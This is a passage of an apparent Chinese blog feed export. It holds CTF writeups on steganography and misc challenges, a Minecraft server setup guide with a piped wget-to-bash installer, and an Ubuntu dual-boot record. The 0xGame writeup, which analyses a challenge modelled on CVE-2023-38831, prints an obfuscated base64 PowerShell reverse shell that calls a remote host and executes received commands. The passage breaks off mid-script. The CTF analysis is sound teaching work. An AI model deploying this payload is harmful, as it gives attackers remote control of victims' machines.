class="built_in">print</span>(result_string)</span><br></pre></td></tr></table></figure><p>cyberchef转换一下，删去一些0以后发现结尾有倒着的png头</p><figure><img src="/images/国城杯2024-Writeup/image-20241209184653844.png"alt="image-20241209184653844" /><figcaption aria-hidden="true">image-20241209184653844</figcaption></figure><p>处理一下保存为png</p><figure><img src="/images/国城杯2024-Writeup/image-20241209184747610.png"alt="image-20241209184747610" /><figcaption aria-hidden="true">image-20241209184747610</figcaption></figure><figure><img src="/images/国城杯2024-Writeup/image-20241209185016483.png"alt="image-20241209185016483" /><figcaption aria-hidden="true">image-20241209185016483</figcaption></figure><p>这就是key.zip的密码。解压得到的key开头有段base64</p><figure><img src="/images/国城杯2024-Writeup/image-20241209185254500.png"alt="image-20241209185254500" /><figcaption aria-hidden="true">image-20241209185254500</figcaption></figure><figure><img src="/images/国城杯2024-Writeup/image-20241209185317446.png"alt="image-20241209185317446" /><figcaption aria-hidden="true">image-20241209185317446</figcaption></figure><p>提示了这是一个stl文件，删去开头的base64，修改后缀名为.stl，用<ahref="https://www.3dpea.com/cn/view-STL-online">这个网站</a>查看，即可看到key</p><figure><img src="/images/国城杯2024-Writeup/image-20241209185656525.png"alt="image-20241209185656525" /><figcaption aria-hidden="true">image-20241209185656525</figcaption></figure><p>用这个key去对不知道是什么东西的flag文件异或一下，可以得到一个wav文件</p><figure><img src="/images/国城杯2024-Writeup/image-20241209185954584.png"alt="image-20241209185954584" /><figcaption aria-hidden="true">image-20241209185954584</figcaption></figure><p>提取<ahref="https://sumit-arora.medium.com/audio-steganography-the-art-of-hiding-secrets-within-earshot-part-2-of-2-c76b1be719b3">音频lsb隐写</a>，得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> wave</span><br><span class="line">song = wave.<span class="built_in">open</span>(<span class="string">&quot;download.wav&quot;</span>, mode=<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line"><span class="comment"># Convert audio to byte array</span></span><br><span class="line">frame_bytes = <span class="built_in">bytearray</span>(<span class="built_in">list</span>(song.readframes(song.getnframes())))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Extract the LSB of each byte</span></span><br><span class="line">extracted = [frame_bytes[i] &amp; <span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(frame_bytes))]</span><br><span class="line"><span class="comment"># Convert byte array back to string</span></span><br><span class="line">string = <span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,extracted[i:i+<span class="number">8</span>])),<span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(extracted),<span class="number">8</span>))</span><br><span class="line"><span class="comment"># Cut off at the filler characters</span></span><br><span class="line">decoded = string.split(<span class="string">&quot;###&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Print the extracted text</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Sucessfully decoded: &quot;</span>+decoded)</span><br><span class="line">song.close()</span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D0g3xGC&#123;U_4rE_4_WhI2_4t_Ste9An09r4pHY&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 国城杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MC服务器搭建</title>
      <link href="/posts/9deebcb5/"/>
      <url>/posts/9deebcb5/</url>
      
        <content type="html"><![CDATA[<blockquote><p>记录一下我唯一玩、最热爱的游戏MC服务器的搭建，这里使用的是MCSManager</p><p>随着使用的深入，后续会添加更多</p></blockquote><p>这里使用到的：一台带有公网ip的ubuntu22.04-x64系统服务器、<ahref="https://github.com/MCSManager/MCSManager">MCSManager面板</a>，我们要安装的是java1.21.4-Fabric版本</p><h2 id="预操作">预操作</h2><p>先进行一些经典操作</p><h3 id="更新软件源">更新软件源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br></pre></td></tr></table></figure><h3 id="开放端口">开放端口</h3><p>启动防火墙，开放端口，下面我们会用到的是23333、24444和25565端口，特别要注意的是别忘了开放自己ssh所用的端口，这里我使用的是49578端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ufw <span class="built_in">enable</span></span><br><span class="line">ufw allow 23333/tcp 24444/tcp 25565/tcp 49578/tcp</span><br><span class="line">ufw status         <span class="comment">#检查已开放端口</span></span><br></pre></td></tr></table></figure><h2 id="安装java">安装java</h2><p>由于我们要安装的是1.21.4版，因此需要安装对应的java21的环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install openjdk-21-jdk</span><br><span class="line">java -version      <span class="comment">#检查是否安装成功</span></span><br></pre></td></tr></table></figure><h2 id="面板安装">面板安装</h2><h3 id="一键安装">一键安装</h3><p>官方给出的一键安装方法（实测国内服务器可用）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su -c <span class="string">&quot;wget -qO- https://script.mcsmanager.com/setup.sh | bash&quot;</span></span><br></pre></td></tr></table></figure><figure><img src="/images/MC服务器搭建/image-20241205194127608.png"alt="image-20241205194127608" /><figcaption aria-hidden="true">image-20241205194127608</figcaption></figure><h3 id="手动安装">手动安装</h3><p>官方给出的手动安装方法（没测过）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Create /opt directory if not already</span></span><br><span class="line"><span class="built_in">mkdir</span> /opt</span><br><span class="line"><span class="comment"># Switch to /opt</span></span><br><span class="line"><span class="built_in">cd</span> /opt/</span><br><span class="line"><span class="comment"># Download Node.js 20.11. If you already have Node.js 16+ installed, ignore this step.</span></span><br><span class="line">wget https://nodejs.org/dist/v20.11.0/node-v20.11.0-linux-x64.tar.xz</span><br><span class="line"><span class="comment"># Decompress Node.js source</span></span><br><span class="line">tar -xvf node-v20.11.0-linux-x64.tar.xz</span><br><span class="line"><span class="comment"># Add Node.js to system PATH</span></span><br><span class="line"><span class="built_in">ln</span> -s /opt/node-v20.11.0-linux-x64/bin/node /usr/bin/node</span><br><span class="line"><span class="built_in">ln</span> -s /opt/node-v20.11.0-linux-x64/bin/npm /usr/bin/npm</span><br><span class="line"></span><br><span class="line"><span class="comment"># Prepare MCSM&#x27;s installation directory</span></span><br><span class="line"><span class="built_in">mkdir</span> /opt/mcsmanager/</span><br><span class="line"><span class="built_in">cd</span> /opt/mcsmanager/</span><br><span class="line"></span><br><span class="line"><span class="comment"># Download MCSManager</span></span><br><span class="line">wget https://github.com/MCSManager/MCSManager/releases/latest/download/mcsmanager_linux_release.tar.gz</span><br><span class="line">tar -zxf mcsmanager_linux_release.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># Install dependencies</span></span><br><span class="line">./install.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># Please open two terminals or screens.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Start the daemon first.</span></span><br><span class="line">./start-daemon.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># Start the web interface at the second terminal or screen.</span></span><br><span class="line">./start-web.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># For web access, go to http://localhost:23333/</span></span><br><span class="line"><span class="comment"># In general, the web interface will automatically scan and add the local daemon.</span></span><br></pre></td></tr></table></figure><p>MCSM的启动和暂停</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start mcsm-&#123;web,daemon&#125;</span><br><span class="line">systemctl stop mcsm-&#123;web,daemon&#125;</span><br></pre></td></tr></table></figure><h2 id="mc启动">MC，启动！</h2><p>访问23333端口，即为MCSM的面板，自己注册一个账号。</p><p><strong>注意：这个账号只能在这时注册一次，一旦注册成功，其用户名和密码将无法再修改！所以一定要记住账号密码！</strong><imgsrc="/images/MC服务器搭建/image-20241205194518342.png"alt="image-20241205194518342" /></p><p>先在<ahref="https://fabricmc.net/use/server/">fabric的官网</a>上下载一个服务端的核心</p><figure><img src="/images/MC服务器搭建/image-20241205195446296.png"alt="image-20241205195446296" /><figcaption aria-hidden="true">image-20241205195446296</figcaption></figure><p>接下来就是在面板上创建一个实例</p><figure><img src="/images/MC服务器搭建/image-20241205195727811.png"alt="image-20241205195727811" /><figcaption aria-hidden="true">image-20241205195727811</figcaption></figure><figure><img src="/images/MC服务器搭建/image-20241205195802911.png"alt="image-20241205195802911" /><figcaption aria-hidden="true">image-20241205195802911</figcaption></figure><figure><img src="/images/MC服务器搭建/image-20241205195823300.png"alt="image-20241205195823300" /><figcaption aria-hidden="true">image-20241205195823300</figcaption></figure><figure><img src="/images/MC服务器搭建/image-20241205195904336.png"alt="image-20241205195904336" /><figcaption aria-hidden="true">image-20241205195904336</figcaption></figure><p>这里的启动命令我填写的是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Xmx12G -server -Dfile.encoding=UTF-8 -Duser.language=zh -Duser.country=CN -jar <span class="variable">$&#123;ProgramName&#125;</span></span><br></pre></td></tr></table></figure><p>这里的<code>-Xmx12G</code>表示内存限制最大为12G，填写这个的时候根据自己的服务器实际情况来，比服务器内存小一点就行。剩下的<code>-Dfile.encoding=UTF-8</code>表示编码定义为UTF-8，<code>-Duser.language=zh</code>表示语言为中文，<code>-Duser.country=CN</code>表示国家为中国，防止后面出现乱码的问题。</p><figure><img src="/images/MC服务器搭建/image-20241205200136679.png"alt="image-20241205200136679" /><figcaption aria-hidden="true">image-20241205200136679</figcaption></figure><p>接下来在选择文件中上传我们刚刚下载的服务端核心，上传成功实例就会启动。</p><figure><img src="/images/MC服务器搭建/image-20241205200644403.png"alt="image-20241205200644403" /><figcaption aria-hidden="true">image-20241205200644403</figcaption></figure><p>接下来点击前往实例控制台，然后点击开启，等待下载一些配置，看到下面的输出即为安装成功</p><figure><img src="/images/MC服务器搭建/image-20241205201011935.png"alt="image-20241205201011935" /><figcaption aria-hidden="true">image-20241205201011935</figcaption></figure><p>看到说Failed to load eula.txt，往下翻，点击服务端配置文件</p><figure><img src="/images/MC服务器搭建/image-20241205201153091.png"alt="image-20241205201153091" /><figcaption aria-hidden="true">image-20241205201153091</figcaption></figure><p>编辑eula.txt</p><figure><img src="/images/MC服务器搭建/image-20241205201228724.png"alt="image-20241205201228724" /><figcaption aria-hidden="true">image-20241205201228724</figcaption></figure><p>改为是以后点击保存</p><figure><img src="/images/MC服务器搭建/image-20241205201257796.png"alt="image-20241205201257796" /><figcaption aria-hidden="true">image-20241205201257796</figcaption></figure><p>回到终端，再一次点击开启，看到一下输出即为启动成功</p><figure><img src="/images/MC服务器搭建/image-20241205201510296.png"alt="image-20241205201510296" /><figcaption aria-hidden="true">image-20241205201510296</figcaption></figure><p>至此，MC服务器已初步搭建完毕。</p><h2 id="一些更多的配置">一些更多的配置</h2><h3 id="server.properties">server.properties</h3><p>还是选择服务端配置文件，编辑server.properties</p><p>里面的标注其实已经很清楚了，照着按需求改就行</p><figure><img src="/images/MC服务器搭建/image-20241205203942290.png"alt="image-20241205203942290" /><figcaption aria-hidden="true">image-20241205203942290</figcaption></figure><h3 id="模组添加">模组添加</h3><p>打开文件管理，找到mods文件夹，把模组放进去就行</p><figure><img src="/images/MC服务器搭建/image-20241205212046811.png"alt="image-20241205212046811" /><figcaption aria-hidden="true">image-20241205212046811</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Technology </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MC </tag>
            
            <tag> Technology </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>吾杯2024 Writeup</title>
      <link href="/posts/8841bb0/"/>
      <url>/posts/8841bb0/</url>
      
        <content type="html"><![CDATA[<h4 id="writeup点我"><ahref="https://www.blog.st4rr.top/writeups/吾杯2024Writeup.pdf">Writeup点我</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 吾杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu双系统安装记录</title>
      <link href="/posts/a7636cee/"/>
      <url>/posts/a7636cee/</url>
      
        <content type="html"><![CDATA[<blockquote><p>之前装过双系统没有写记录，导致现在又需要装就不得不又到处找文章。遂决定这一次写一下记录，方便之后查找。。。</p></blockquote><p>参考文章：</p><p><ahref="https://blog.csdn.net/sslFxxx/article/details/140161076?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-140161076.142%5Ev100%5Epc_search_result_base1&amp;spm=1018.2226.3001.4187">传送门一</a>，<ahref="https://blog.csdn.net/weixin_65688914/article/details/132661114?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522cb99f07ca56697c5ff7a5b882bb2ea53%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=cb99f07ca56697c5ff7a5b882bb2ea53&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-132661114-null-null.142%5Ev100%5Epc_search_result_base1&amp;utm_term=ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85&amp;spm=1018.2226.3001.4187">传送门二</a>，<ahref="https://blog.csdn.net/weixin_65688914/article/details/132661114?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522cb99f07ca56697c5ff7a5b882bb2ea53%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=cb99f07ca56697c5ff7a5b882bb2ea53&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-132661114-null-null.142%5Ev100%5Epc_search_result_base1&amp;utm_term=ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85&amp;spm=1018.2226.3001.4187">传送门三</a></p><p>首先在<ahref="https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/24.10/">清华镜像源</a>下载需要的镜像，这里我下载的是ubuntu24.10</p><figure><img src="/images/ubuntu双系统安装记录/image-20241124184845671.png"alt="image-20241124184845671" /><figcaption aria-hidden="true">image-20241124184845671</figcaption></figure><p>接下来需要准备一个8G以上的空U盘，用来制作启动盘。这里我用的是rufus4.6.exe。</p><p><img src="/images/ubuntu双系统安装记录/image-20241124185224489.png" alt="image-20241124185224489" style="zoom:50%;" /></p><p><img src="/images/ubuntu双系统安装记录/image-20241124185302414.png" alt="image-20241124185302414" style="zoom:50%;" /></p><p>在要安装双系统的电脑本身的windows上打开开始-磁盘管理，右键打算从中分出分出空间给ubuntu的磁盘，选择压缩卷</p><p><img src="/images/ubuntu双系统安装记录/image-20241124191552068.png" alt="image-20241124191552068" style="zoom:50%;" /></p><p>输入要分配出的空间大小，这里我分配了200个G，点击压缩</p><p><img src="/images/ubuntu双系统安装记录/image-20241124191739330.png" alt="image-20241124191739330" style="zoom:50%;" /></p><p>由于我的电脑是联想的，开机的时候按F12进入Boot Menu，选择USBHDD回车</p><figure><img src="/images/ubuntu双系统安装记录/image-20241124192853905.png"alt="image-20241124192853905" /><figcaption aria-hidden="true">image-20241124192853905</figcaption></figure><p>直接选第一个回车</p><figure><imgsrc="/images/ubuntu双系统安装记录/0420f115bee9524fc5ff603f74dbe65.jpg"alt="0420f115bee9524fc5ff603f74dbe65" /><figcaptionaria-hidden="true">0420f115bee9524fc5ff603f74dbe65</figcaption></figure><p>进入后进行一系列配置，如下</p><figure><img src="/images/ubuntu双系统安装记录/image-20241124202556638.png"alt="image-20241124202556638" /><figcaption aria-hidden="true">image-20241124202556638</figcaption></figure><figure><img src="/images/ubuntu双系统安装记录/image-20241124202602331.png"alt="image-20241124202602331" /><figcaption aria-hidden="true">image-20241124202602331</figcaption></figure><figure><img src="/images/ubuntu双系统安装记录/image-20241124202607349.png"alt="image-20241124202607349" /><figcaption aria-hidden="true">image-20241124202607349</figcaption></figure><figure><img src="/images/ubuntu双系统安装记录/image-20241124202615933.png"alt="image-20241124202615933" /><figcaption aria-hidden="true">image-20241124202615933</figcaption></figure><figure><img src="/images/ubuntu双系统安装记录/image-20241124202620614.png"alt="image-20241124202620614" /><figcaption aria-hidden="true">image-20241124202620614</figcaption></figure><figure><img src="/images/ubuntu双系统安装记录/image-20241124202626786.png"alt="image-20241124202626786" /><figcaption aria-hidden="true">image-20241124202626786</figcaption></figure><p><img src="/images/ubuntu双系统安装记录/image-20241124202632823.png"alt="image-20241124202632823" /><imgsrc="/images/ubuntu双系统安装记录/image-20241124202640936.png"alt="image-20241124202640936" /></p><figure><img src="/images/ubuntu双系统安装记录/image-20241124202647820.png"alt="image-20241124202647820" /><figcaption aria-hidden="true">image-20241124202647820</figcaption></figure><figure><img src="/images/ubuntu双系统安装记录/image-20241124202652450.png"alt="image-20241124202652450" /><figcaption aria-hidden="true">image-20241124202652450</figcaption></figure><figure><img src="/images/ubuntu双系统安装记录/image-20241124202658499.png"alt="image-20241124202658499" /><figcaption aria-hidden="true">image-20241124202658499</figcaption></figure><figure><img src="/images/ubuntu双系统安装记录/image-20241124202704096.png"alt="image-20241124202704096" /><figcaption aria-hidden="true">image-20241124202704096</figcaption></figure><p>接下来等待一会儿，点击重启，拔掉U盘后按enter即可。</p><p>如有问题欢迎留言或者联系作者交流()</p>]]></content>
      
      
      <categories>
          
          <category> Technology </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Technology </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2024 Writeup</title>
      <link href="/posts/df428ec6/"/>
      <url>/posts/df428ec6/</url>
      
        <content type="html"><![CDATA[<blockquote><p>跟w8nn9z师傅组队参加的这次比赛，题目质量挺不错的，能学到挺多东西</p></blockquote><h4 id="writeup点我"><ahref="https://www.blog.st4rr.top/writeups/极客大挑战2024Writeup.pdf">Writeup点我</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 极客大挑战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0xGame2024 Misc Official Writeup</title>
      <link href="/posts/511d172f/"/>
      <url>/posts/511d172f/</url>
      
        <content type="html"><![CDATA[<blockquote><p>其中打*的是我出的题</p></blockquote><h2 id="misc">Misc</h2><h3 id="xgame2048">0xGame2048*</h3><p>提取一下题目中的关键词"2048"、"base"搜索一下，其实不难找到一种叫做base2048的编码。解密的方法有很多，我这里用的是toolsfx。</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1728912622916-03061021-430b-4491-9ff6-b88909cd2313.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="一明一暗">一明一暗*</h3><p>这道题在出题时使用的是Bandizip7.36，默认使用了快速压缩的方法。然而很多师傅的Bandizip默认的是正常压缩，因而在做题时出现了无法执行攻击的问题，这里不是出题人本意o(╥﹏╥)o，出题时并没有想过在这里设置门槛，给师傅们磕一个了。Orz</p><p>然而仍然有很多厉害的师傅通过各种方法解出来了，比如挨个尝试各种压缩方法、通过文件大小判断正确的压缩方法、以及直接从attachment.zip中抽去1.zip使其成为一个明文包（膜拜），因此也就没有修改题目。</p><p>接下来说一下预期解。</p><p>首先将得到的f1ag.jpg压缩成一个明文包，然后使用ARCHPR执行明文攻击。明文攻击时用不着等这个进度条全部走完，只需要到如下状态就可以直接点停止，保存下来的zip文件就是已经解密好的。</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1728912622997-0f54f3e8-18f9-41cb-9e61-33ff855d4e70.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>根据hint.txt的内容可以得知这是一个盲水印，可以在网上找到这样一个工具，直接对flag.png提取就行。</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1728912622960-e9c19936-d8bd-4e81-9b42-76cb973c1488.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1728912623024-5f16fd12-1eb9-4319-a296-a1b952a611a7.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="加密的压缩包">加密的压缩包？</h3><p>用010editor查看，压缩包末尾给了一个password，可知这个压缩包原本应该是被加密了的。但是从加密标识位（下图选中部分）来看，这里是被设置成了未加密，因此这里其实是个伪不加密。</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1728912623005-978bd4db-fcff-4198-b5a7-417be0fbf4b8.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1728912624583-1db33a15-a6d4-4219-8c9d-9f2e4c532379.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>将加密位改为09以后保存，输入密码0xGame2024即可解压</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1728912624629-9d5cbb81-7a05-4571-bc87-600f74274f37.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1728912624616-b7537c66-a4af-4b79-a4eb-33a673bc544b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="我的世界基岩版">我的世界基岩版(?*</h3><p>先说一下预期解：</p><p>下载地图模组xaero's minimap和xaero'sworldmap即可大概看到flag的轮廓，就是地上的那些基岩组成的字。接下来就是实地考察一下+尝试，可以得到flag是0xGame{MC_SErver_4_CTFers}</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1728912624631-d9a0ec8e-69aa-449c-97c9-63c33a005235.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>此外还有很多方法也都在预期之内，比如向上搭天梯看、使用tweakeroo模组直接灵魂出窍飞起来看、或者直接开各种各样的外挂都行。</p><p>服务器开出来一段时间后，有师傅搭建并维护了出生点物资领取处、天路、铁轨等造福后来的师傅（辛苦了）。但也有一些调皮的师傅，到处插告示牌在上面留假flag或者做假引导，出题人都在发现的第一时间进行了拆除。所以不要再拷打出题人了，那真的不是题目的一部分o(╥﹏╥)o:(</p><h3 id="呜呜呜我再也不敢乱点了">呜呜呜~我再也不敢乱点了*</h3><p>灵感来源于CVE-2023-38831，当时看到感觉挺有意思的，就当成题出了</p><p>不过从解题来说知不知道这个CVE影响其实不大，感兴趣的可以了解一下</p><p>题目附件给了一个 <code>somethingGOOD.pcapng</code>和一个<code>what_is_this.log</code>，打开流量包可以看到是TLS1.3协议的流量：</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1729496036561-30c65c77-4951-49ca-9e26-ebd61908ddae.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>查阅资料可知可以用 <code>key log</code>文件，也就是<code>what_is_this.log</code>来解密TLS流量，在wireshark中的<code>编辑-&gt;首选项-&gt;协议</code> 里找到TLS：</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1729496036668-894ee1a9-1641-448f-b719-bbd2bab0a8c0.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>之后就能看到http协议传输的 <code>wuyu.zip</code>，可以在<code>文件-&gt;导出对象-&gt;HTTP</code>中提取出来并解压，可以看到<code>introduction.txt</code>目录下有两个可疑文件，<code>clean_file_rubbish.ps1</code>以及 <code>introduction.txt .bat</code></p><p>可以先对 <code>introduction.txt .bat</code>进行分析，里面大部分是注释，真正执行的是当前目录下的ps1脚本文件：</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1729496036684-ddc2aca5-d1ae-4803-a1f3-3d10036c15c9.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>于是可以继续分析 <code>clean_file_rubbish.ps1</code>，表面上是一个清理文件的功能，但同样这些代码都是被注释掉的，往下拖拉可以看到真正被混淆的powershell代码：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># just some unordered and garbled characters</span></span><br><span class="line"><span class="variable">$Cx99zNP0yc8btz1DgdjQ4d6Or1WXvNo8ujcqwFC3kgHFE9zERLRSUflsWbCwFagZeNLAt8td0BUZr85MNnhsIJtjt4781b120rrHzFZmMsUAPcAS4tHCiJx9Vst4SWWeSBn8IkFD6e4O6bMfzboKxPZiplfSpAXYD1iHJbuWsDciLYdqfa9TcbYHOWxeR91cFzmnKRYSFU573fAKQqZMCsiaLB2ZMGMlIbshBlb94PHljepzqNuqEo2uRQ0Pg4hLsKE7D4cXoCXuDAUwHPVQm3Jz6KQcfUWAlvGzhQKyzLBXGta8LH6Ua0yL8nFCPU4O3uIh58sIpSPEdxO4HkYZfKSF9ta6hrN2o8YWfbRMIdMHNNgywFv3YVlCzwKWP3suJq7yHHl0O0MW7dtk2t05bteVH0k4O0HOfKLQ4wDPrnwu5Q1d7L6JLvNEC9dAtXx56ACbzCHQMt8ZIaxZeLxWMnB7Q34pe0bmoO1hPZtiRENA4Scp1Gsm</span> = <span class="string">&quot;JExIT1NUID0gIjE5Mi4xNjguOTMuMTMyIjsgJExQT1JUID0gMjMzMzsgJFRDUENsaWVudCA9IE5ldy1PYmplY3QgTmV0LlNvY2tldHMuVENQQ2xpZW50KCRMSE9TVCwgJExQT1JUKTsgJE5ldHdvcmtTdHJlYW0gPSAkVENQQ2xpZW50LkdldFN0cmVhbSgpOyAkU3RyZWFtUmVhZGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIoJE5ldHdvcmtTdHJlYW0pOyAkU3RyZWFtV3JpdGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIoJE5ldHdvcmtTdHJlYW0pOyAkU3RyZWFtV3JpdGVyLkF1dG9GbHVzaCA9ICR0cnVlOyAkQnVmZmVyID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdIDEwMjQ7IHdoaWxlICgkVENQQ2xpZW50LkNvbm5lY3RlZCkgeyB3aGlsZSAoJE5ldHdvcmtTdHJlYW0uRGF0YUF2YWlsYWJsZSkgeyAkUmF3RGF0YSA9ICROZXR3b3JrU3RyZWFtLlJlYWQoJEJ1ZmZlciwgMCwgJEJ1ZmZlci5MZW5ndGgpOyAkQ29kZSA9IChbdGV4dC5lbmNvZGluZ106OlVURjgpLkdldFN0cmluZygkQnVmZmVyLCAwLCAkUmF3RGF0YSAtMSkgfTsgaWYgKCRUQ1BDbGllbnQuQ29ubmVjdGVkIC1hbmQgJENvZGUuTGVuZ3RoIC1ndCAxKSB7ICRPdXRwdXQgPSB0cnkgeyBJbnZva2UtRXhwcmVzc2lvbiAoJENvZGUpIDI+JjEgfSBjYXRjaCB7ICRfIH07ICRTdHJlYW1Xcml0ZXIuV3JpdGUoIiRPdXRwdXRgbiIpOyAkQ29kZSA9ICRudWxsIH0gfTsgJFRDUENsaWVudC5DbG9zZSgpOyAkTmV0d29ya1N0cmVhbS5DbG9zZSgpOyAkU3RyZWFtUmVhZGVyLkNsb3NlKCk7ICRTdHJlYW1Xcml0ZXIuQ2xvc2UoKQ==&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Don&#x27;t think too much</span></span><br><span class="line"><span 